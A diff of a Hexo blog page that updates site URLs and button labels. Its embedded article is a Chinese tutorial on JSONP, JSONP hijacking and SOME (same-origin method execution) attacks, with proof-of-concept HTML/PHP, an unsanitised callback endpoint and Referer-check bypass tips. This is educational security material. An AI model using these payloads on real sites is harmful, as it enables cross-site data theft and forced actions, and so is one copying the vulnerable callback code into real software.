@@ -11,11 +11,11 @@
     
     
     
-    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"同源策略主机 端口 域名 必须都一样 \n也就是说 www.p1k.com 和他同源的只有www.p1k.com\n\n\njson与jsonp区别json是一种基于文本的轻量级的数据交换格式\njsonp是一种协议 ，准确的说，他是json的一种使用模式，因为浏览器有同源策略的限制，像test1.sec.com和test2.sec.com是无法之间通信的，但是 调用js文件，却不受同源的影响，并且src属性引入的文件都不受同源的限制，这也是同源策略留下的一个后门，为了方便\n所以要想把远程数据加载到web页面中，就得把复杂数据转换为js文件，注意json数据是被js原生支持的，\n这样就可以把复杂数据转换成轻巧的json数据\n看一下具体实现\n写入js文件调用1.html写入\n12345678910111213&lt;html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;function test(data)&#123;\talert(\"name:\"+data.name+\"city:\"+data.city);&#125;&lt;/script&gt;&lt;script src=\"http://www.p1k.com/data.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\ndata.js写入\n1234test(&#123;    \"name\": \"p1k\",    \"city\": \"china\"&#125;);\n\n访问一下可以看到，跨域访问成功，弹窗\n\n\n但是这样问题又来了，这里是直接去访问的data.js文件，并且data.js文件中只有一个函数，客户端界面也只有一个函数，如果data.js中有多个函数，前端页面中也有多个函数呢？这样服务器怎样知道客户端调用的是那个函数，该返回怎样的数据。\njsonp动态调用通过在客户端添加一个callback回调函数\n测试\n1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;function test1(data)&#123;\talert(\"name:\"+data.name+\"city:\"+data.city);&#125;function test2(data)&#123;\talert(\"name:\"+data.name);&#125;&lt;/script&gt;&lt;script src=\"http://www.p1k.com/data.php?callback=test2&amp;name=p1k\"&gt;&lt;/script&gt;&lt;!--&lt;script src=\"http://www.p1k.com/data.php?callback=test1&amp;name=p1k\"&gt;&lt;/script&gt;--&gt;&lt;/body&gt;&lt;/html&gt;\n\ndata.php\n12345678910111213&lt;?php$data1=array(\"name\"=&gt;\"p1k\",\"city\"=&gt;\"China\");$data2=array(\"name\"=&gt;\"tusiji\",\"city\"=&gt;\"Russia\");if ($_GET['name']==='p1k') &#123;\t$data=$data1;&#125;if ($_GET['name']==='tusiji') &#123;\t$data=$data2;&#125;$callback = $_GET['callback'];exit($callback.\"(\".json_encode($data).\")\");?&gt;\n\n这两段代码，前后端都是多条数据\n如果callback==test2的话，弹窗只显示name  等于test1的话，会把name city都弹出来\njQuery深入一下 看一下jquery调用jsonp的方式\n123456789101112131415161718192021222324252627&lt;!DOCTYPE html &gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=\"text/javascript\" src=\"jquery-3.3.1.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;\t$(document).ready(function()&#123;        $.ajax(&#123;             type: \"get\",             url: \"http://www.p1k.com/data.php?name=p1k\",             dataType: \"jsonp\",             jsonp: \"callback\",//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)             jsonpCallback:\"test1\",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写\"?\"，jQuery会自动为你处理数据             success: function(data)&#123;                 alert(\"name:\"+data.name+\"city:\"+data.city);             &#125;,             error: function()&#123;                 alert('fail');             &#125;        &#125;);    &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\njQuery会自动的去调用，callback函数\n联系看到这里应该就知道了json和jsonp的联系了\njsonp只是跨域传送json的一种方式，一种更方便的方式\n了解完json和jsonp 在来看看他们的安全问题\njson jsonp安全问题jsonp劫持本质上属于CSRF的一种，只不过jsonp主要用来获取数据，造成该漏洞的原因是，目标站点没有对请求的referer进行检查，导致任何站点都可以去访问json数据，\n攻击过程还是以上面的代码为例\n正常情况下data.php中的数据，只有referer是www.p1k.com 才能访问\n新建一个站点www.test.com\njson.html写入\n123456789&lt;html&gt;&lt;script&gt;function csrf(data)&#123;\talert(\"name:\"+data.name+\"city:\"+data.city);&#125;&lt;/script&gt;&lt;script src=\"http://www.p1k.com/data.php?callback=csrf&amp;name=tusiji\"&gt;&lt;/script&gt;&lt;/html&gt;\n\n本地模拟受害者 访问一下 www.test.com/json.html  弹窗\n\n看一下referer \n1Referer\t http://www.test.com/json.html\n\ndata.php没有对请求的referer进行限制，导致数据泄露\n修复no.1  限制referer\n123if ($_SERVER['HTTP_REFERER']!=='http://www.p1k.com/1.html') &#123;\texit(\"非法访问\");&#125;\n\nno.2   使用token\n随机的生成一段token值，每次提交表单都要检查，攻击者没有token就不能访问\n绕过针对上面两种修复方式 也都有对应的绕过方式\ndata URI 绕过 refererdata URI不会发送referer头 data还可以使用base64编码\nhttps转到http  refererhttps转到http会返回一个空的referer (为了防止数据泄露)\n绕过token具体案例\nhttp://www.91ri.org/13407.html\nsome攻击some攻击 也叫同源方法执行，可以自动关注微博，自动授权等等\n理论上任何具备点击功能的网站都存在被攻击的可能\n比如说某个网站存在一个xss点，我们想要获取的数据在父窗口，但是窗口不是通过window.open打开的，无法用window.opener操作父窗口，这时候就可以用some来获去我们想要的数据\n限制条件no.1 同源策略 这里和上面的jsonp劫持不太一样，jsonp劫持直接使用了src属性，所以可以突破同源策略的限制\nno.2 callback参数可控，因为要通过callback去调用敏感操作，所以callback参数要可控\n这里引用LoRexxar师傅的例子  为了模拟攻击过程，我把some1.html  some2.html放在www.test.com上\njsonp.php secret.html放在www.p1k.com上\n攻击过程some1.html\n12345678&lt;script&gt;    function start_some() &#123;        window.open(\"some2.html\");        location.replace(\"http://www.p1k.com/secret.html\");    &#125;    setTimeout(start_some(), 1000);&lt;/script&gt;\n\nsome2.html\n12345678&lt;script&gt;    function attack() &#123;        location.replace(\"http://www.p1k.com/jsonp.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click\");    &#125;    setTimeout(attack, 2000);&lt;/script&gt;\n\njsonp.php\n123456&lt;?php$callback = empty($_GET[\"callback\"]) ? \"jsCallback\" : $_GET[\"callback\"];echo \"&lt;script&gt;\";echo $callback . \"()\";echo \"&lt;/script&gt;\";\n\nsecret.html\n12345678910&lt;html&gt;&lt;form&gt;    &lt;button onclick=\"c()\"&gt;Secret Button&lt;/button&gt;    &lt;/form&gt;&lt;script&gt;    function c() &#123;        alert(\"LoRexxar click!\");    &#125;&lt;/script&gt;&lt;/html&gt;\n\n访问some1.html \nsome1.html指向了secret.html 会打开一个新的标签页some2.html 随后指向jsonp.php ，随后secret.html页面弹窗\n梳理一下过程\n第一步 先是访问了some1.html  这个页面会打开一个新的页面some2.html  那么some2.html的父页面就是some1.html  然后用http://www.p1k.com/secret.html 敏感页面 替换了some1.html页面 那么现在some2.html的父页面就是secret.html 但是some2.html 和 secret.html不同源，所以some2.html不能通过callback回调secret中的敏感函数，(这里如果同源 那么直接就让some2.html调用callback回调函数就可以)\n那么如何解决some2.html和secret.html同源，并且可以调用callback回调函数的问题呢？\n只要让some2.html指向一个和secret.html同源的页面，并且该页面中要有callback回调函数，就能解决问题了\n构造第二步\n第二步  some2.html 会指向http://www.p1k.com/jsonp.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click  那么jsonp.php的父页面是不是就变成了secret.html呢  而且二者同源，都是在www.p1k.com这个web站点下\n这里通过window.open window.opener来达到同源的目的，但是chrome firefox貌似都是默认禁止打开新的窗口，有一定的局限性\n这里在放上柠檬师傅的构造方式 通过iframe 避免了打开新窗口的局限性\n12345678910        &lt;iframe src=\"https://www.someattack.com/Playground/\" name=b&gt;&lt;/iframe&gt;        &lt;iframe name=a&gt;&lt;/iframe&gt;        &lt;script&gt;        window.frames[0].open('https://www.someattack.com/Playground/','a');        setTimeout(          function()&#123;            window.frames[1].location.href = 'https://www.someattack.com/Playground/ColorPicker.php?callback=document.body.firstElementChild.lastElementChild.lastElementChild.lastElementChild.previousSibling.previousSibling.lastElementChild.click'          &#125;        ,1000);&lt;/script&gt;\n\n修复把回调函数加入到白名单\n注册回调函数\n参考链接\nhttps://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html\nhttps://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/\nhttps://paper.seebug.org/452/#_3\n","dateCreated":"2019-10-10T20:06:44+08:00","dateModified":"2020-02-26T13:43:54+08:00","datePublished":"2019-10-10T20:06:44+08:00","description":"同源策略主机 端口 域名 必须都一样 \n也就是说 www.p1k.com 和他同源的只有www.p1k.com","headline":"jsonp","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://yoursite.com/2019/10/10/jsonp/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://yoursite.com/2019/10/10/jsonp/"}</script>
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"articleBody":"同源策略主机 端口 域名 必须都一样 \n也就是说 www.p1k.com 和他同源的只有www.p1k.com\n\n\njson与jsonp区别json是一种基于文本的轻量级的数据交换格式\njsonp是一种协议 ，准确的说，他是json的一种使用模式，因为浏览器有同源策略的限制，像test1.sec.com和test2.sec.com是无法之间通信的，但是 调用js文件，却不受同源的影响，并且src属性引入的文件都不受同源的限制，这也是同源策略留下的一个后门，为了方便\n所以要想把远程数据加载到web页面中，就得把复杂数据转换为js文件，注意json数据是被js原生支持的，\n这样就可以把复杂数据转换成轻巧的json数据\n看一下具体实现\n写入js文件调用1.html写入\n12345678910111213&lt;html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;function test(data)&#123;\talert(\"name:\"+data.name+\"city:\"+data.city);&#125;&lt;/script&gt;&lt;script src=\"http://www.p1k.com/data.js\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\ndata.js写入\n1234test(&#123;    \"name\": \"p1k\",    \"city\": \"china\"&#125;);\n\n访问一下可以看到，跨域访问成功，弹窗\n\n\n但是这样问题又来了，这里是直接去访问的data.js文件，并且data.js文件中只有一个函数，客户端界面也只有一个函数，如果data.js中有多个函数，前端页面中也有多个函数呢？这样服务器怎样知道客户端调用的是那个函数，该返回怎样的数据。\njsonp动态调用通过在客户端添加一个callback回调函数\n测试\n1234567891011121314151617&lt;html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script&gt;function test1(data)&#123;\talert(\"name:\"+data.name+\"city:\"+data.city);&#125;function test2(data)&#123;\talert(\"name:\"+data.name);&#125;&lt;/script&gt;&lt;script src=\"http://www.p1k.com/data.php?callback=test2&amp;name=p1k\"&gt;&lt;/script&gt;&lt;!--&lt;script src=\"http://www.p1k.com/data.php?callback=test1&amp;name=p1k\"&gt;&lt;/script&gt;--&gt;&lt;/body&gt;&lt;/html&gt;\n\ndata.php\n12345678910111213&lt;?php$data1=array(\"name\"=&gt;\"p1k\",\"city\"=&gt;\"China\");$data2=array(\"name\"=&gt;\"tusiji\",\"city\"=&gt;\"Russia\");if ($_GET['name']==='p1k') &#123;\t$data=$data1;&#125;if ($_GET['name']==='tusiji') &#123;\t$data=$data2;&#125;$callback = $_GET['callback'];exit($callback.\"(\".json_encode($data).\")\");?&gt;\n\n这两段代码，前后端都是多条数据\n如果callback==test2的话，弹窗只显示name  等于test1的话，会把name city都弹出来\njQuery深入一下 看一下jquery调用jsonp的方式\n123456789101112131415161718192021222324252627&lt;!DOCTYPE html &gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Test&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=\"text/javascript\" src=\"jquery-3.3.1.min.js\"&gt;&lt;/script&gt;&lt;script type=\"text/javascript\"&gt;\t$(document).ready(function()&#123;        $.ajax(&#123;             type: \"get\",             url: \"http://www.p1k.com/data.php?name=p1k\",             dataType: \"jsonp\",             jsonp: \"callback\",//传递给请求处理程序或页面的，用以获得jsonp回调函数名的参数名(一般默认为:callback)             jsonpCallback:\"test1\",//自定义的jsonp回调函数名称，默认为jQuery自动生成的随机函数名，也可以写\"?\"，jQuery会自动为你处理数据             success: function(data)&#123;                 alert(\"name:\"+data.name+\"city:\"+data.city);             &#125;,             error: function()&#123;                 alert('fail');             &#125;        &#125;);    &#125;);&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n\njQuery会自动的去调用，callback函数\n联系看到这里应该就知道了json和jsonp的联系了\njsonp只是跨域传送json的一种方式，一种更方便的方式\n了解完json和jsonp 在来看看他们的安全问题\njson jsonp安全问题jsonp劫持本质上属于CSRF的一种，只不过jsonp主要用来获取数据，造成该漏洞的原因是，目标站点没有对请求的referer进行检查，导致任何站点都可以去访问json数据，\n攻击过程还是以上面的代码为例\n正常情况下data.php中的数据，只有referer是www.p1k.com 才能访问\n新建一个站点www.test.com\njson.html写入\n123456789&lt;html&gt;&lt;script&gt;function csrf(data)&#123;\talert(\"name:\"+data.name+\"city:\"+data.city);&#125;&lt;/script&gt;&lt;script src=\"http://www.p1k.com/data.php?callback=csrf&amp;name=tusiji\"&gt;&lt;/script&gt;&lt;/html&gt;\n\n本地模拟受害者 访问一下 www.test.com/json.html  弹窗\n\n看一下referer \n1Referer\t http://www.test.com/json.html\n\ndata.php没有对请求的referer进行限制，导致数据泄露\n修复no.1  限制referer\n123if ($_SERVER['HTTP_REFERER']!=='http://www.p1k.com/1.html') &#123;\texit(\"非法访问\");&#125;\n\nno.2   使用token\n随机的生成一段token值，每次提交表单都要检查，攻击者没有token就不能访问\n绕过针对上面两种修复方式 也都有对应的绕过方式\ndata URI 绕过 refererdata URI不会发送referer头 data还可以使用base64编码\nhttps转到http  refererhttps转到http会返回一个空的referer (为了防止数据泄露)\n绕过token具体案例\nhttp://www.91ri.org/13407.html\nsome攻击some攻击 也叫同源方法执行，可以自动关注微博，自动授权等等\n理论上任何具备点击功能的网站都存在被攻击的可能\n比如说某个网站存在一个xss点，我们想要获取的数据在父窗口，但是窗口不是通过window.open打开的，无法用window.opener操作父窗口，这时候就可以用some来获去我们想要的数据\n限制条件no.1 同源策略 这里和上面的jsonp劫持不太一样，jsonp劫持直接使用了src属性，所以可以突破同源策略的限制\nno.2 callback参数可控，因为要通过callback去调用敏感操作，所以callback参数要可控\n这里引用LoRexxar师傅的例子  为了模拟攻击过程，我把some1.html  some2.html放在www.test.com上\njsonp.php secret.html放在www.p1k.com上\n攻击过程some1.html\n12345678&lt;script&gt;    function start_some() &#123;        window.open(\"some2.html\");        location.replace(\"http://www.p1k.com/secret.html\");    &#125;    setTimeout(start_some(), 1000);&lt;/script&gt;\n\nsome2.html\n12345678&lt;script&gt;    function attack() &#123;        location.replace(\"http://www.p1k.com/jsonp.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click\");    &#125;    setTimeout(attack, 2000);&lt;/script&gt;\n\njsonp.php\n123456&lt;?php$callback = empty($_GET[\"callback\"]) ? \"jsCallback\" : $_GET[\"callback\"];echo \"&lt;script&gt;\";echo $callback . \"()\";echo \"&lt;/script&gt;\";\n\nsecret.html\n12345678910&lt;html&gt;&lt;form&gt;    &lt;button onclick=\"c()\"&gt;Secret Button&lt;/button&gt;    &lt;/form&gt;&lt;script&gt;    function c() &#123;        alert(\"LoRexxar click!\");    &#125;&lt;/script&gt;&lt;/html&gt;\n\n访问some1.html \nsome1.html指向了secret.html 会打开一个新的标签页some2.html 随后指向jsonp.php ，随后secret.html页面弹窗\n梳理一下过程\n第一步 先是访问了some1.html  这个页面会打开一个新的页面some2.html  那么some2.html的父页面就是some1.html  然后用http://www.p1k.com/secret.html 敏感页面 替换了some1.html页面 那么现在some2.html的父页面就是secret.html 但是some2.html 和 secret.html不同源，所以some2.html不能通过callback回调secret中的敏感函数，(这里如果同源 那么直接就让some2.html调用callback回调函数就可以)\n那么如何解决some2.html和secret.html同源，并且可以调用callback回调函数的问题呢？\n只要让some2.html指向一个和secret.html同源的页面，并且该页面中要有callback回调函数，就能解决问题了\n构造第二步\n第二步  some2.html 会指向http://www.p1k.com/jsonp.php?callback=window.opener.document.body.firstElementChild.firstElementChild.click  那么jsonp.php的父页面是不是就变成了secret.html呢  而且二者同源，都是在www.p1k.com这个web站点下\n这里通过window.open window.opener来达到同源的目的，但是chrome firefox貌似都是默认禁止打开新的窗口，有一定的局限性\n这里在放上柠檬师傅的构造方式 通过iframe 避免了打开新窗口的局限性\n12345678910        &lt;iframe src=\"https://www.someattack.com/Playground/\" name=b&gt;&lt;/iframe&gt;        &lt;iframe name=a&gt;&lt;/iframe&gt;        &lt;script&gt;        window.frames[0].open('https://www.someattack.com/Playground/','a');        setTimeout(          function()&#123;            window.frames[1].location.href = 'https://www.someattack.com/Playground/ColorPicker.php?callback=document.body.firstElementChild.lastElementChild.lastElementChild.lastElementChild.previousSibling.previousSibling.lastElementChild.click'          &#125;        ,1000);&lt;/script&gt;\n\n修复把回调函数加入到白名单\n注册回调函数\n参考链接\nhttps://www.cnblogs.com/dowinning/archive/2012/04/19/json-jsonp-jquery.html\nhttps://www.k0rz3n.com/2018/06/05/%E7%94%B1%E6%B5%85%E5%85%A5%E6%B7%B1%E7%90%86%E8%A7%A3JSONP%E5%B9%B6%E6%8B%93%E5%B1%95/\nhttps://paper.seebug.org/452/#_3\n","dateCreated":"2019-10-10T20:06:44+08:00","dateModified":"2020-02-26T13:43:54+08:00","datePublished":"2019-10-10T20:06:44+08:00","description":"同源策略主机 端口 域名 必须都一样 \n也就是说 www.p1k.com 和他同源的只有www.p1k.com","headline":"jsonp","image":[],"mainEntityOfPage":{"@type":"WebPage","@id":"http://p1keman.github.io/2019/10/10/jsonp/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://p1keman.github.io/2019/10/10/jsonp/"}</script>
     <meta name="description" content="同源策略主机 端口 域名 必须都一样  也就是说 www.p1k.com 和他同源的只有www.p1k.com">
 <meta property="og:type" content="blog">
 <meta property="og:title" content="jsonp">
-<meta property="og:url" content="http://yoursite.com/2019/10/10/jsonp/index.html">
+<meta property="og:url" content="http://p1keman.github.io/2019/10/10/jsonp/index.html">
 <meta property="og:site_name" content="Hexo">
 <meta property="og:description" content="同源策略主机 端口 域名 必须都一样  也就是说 www.p1k.com 和他同源的只有www.p1k.com">
 <meta property="og:locale" content="zh-cn">
@@ -349,7 +349,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -360,7 +360,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/10/jsonp/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/10/jsonp/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -373,7 +373,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/10/jsonp/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/10/jsonp/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -386,7 +386,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/10/jsonp/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/10/jsonp/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -399,7 +399,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -464,7 +464,7 @@
             <a
                 class="post-action-btn btn btn--default btn-open-shareoptions"
                 href="#btn-open-shareoptions"
-                aria-label="Diesen Beitrag teilen"
+                aria-label="Share this post"
             >
                 <i class="fa fa-share-alt" aria-hidden="true"></i>
             </a>
@@ -475,7 +475,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/10/jsonp/"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/10/jsonp/"
                     title="分享到 Facebook"
                     aria-label="分享到 Facebook"
                 >
@@ -488,7 +488,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/10/jsonp/"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/10/jsonp/"
                     title="分享到 Twitter"
                     aria-label="分享到 Twitter"
                 >
@@ -501,7 +501,7 @@
             <li class="post-action hide-xs">
                 <a
                     class="post-action-btn btn btn--default"
-                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/10/10/jsonp/"
+                    target="new" href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/10/jsonp/"
                     title="分享到 Google+"
                     aria-label="分享到 Google+"
                 >
@@ -514,7 +514,7 @@
         
         <li class="post-action">
             
-                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
+                <a class="post-action-btn btn btn--default" href="#" aria-label="Back to top">
             
                 <i class="fa fa-list" aria-hidden="true"></i>
             </a>
@@ -535,7 +535,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/10/10/jsonp/"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://p1keman.github.io/2019/10/10/jsonp/"
                         aria-label="分享到 Facebook"
                     >
                         <i class="fab fa-facebook" aria-hidden="true"></i><span>分享到 Facebook</span>
@@ -548,7 +548,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/10/10/jsonp/"
+                        href="https://twitter.com/intent/tweet?text=http://p1keman.github.io/2019/10/10/jsonp/"
                         aria-label="分享到 Twitter"
                     >
                         <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
@@ -561,7 +561,7 @@
                     <a
                         class="share-option-btn"
                         target="new"
-                        href="https://plus.google.com/share?url=http://yoursite.com/2019/10/10/jsonp/"
+                        href="https://plus.google.com/share?url=http://p1keman.github.io/2019/10/10/jsonp/"
                         aria-label="分享到 Google+"
                     >
                         <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
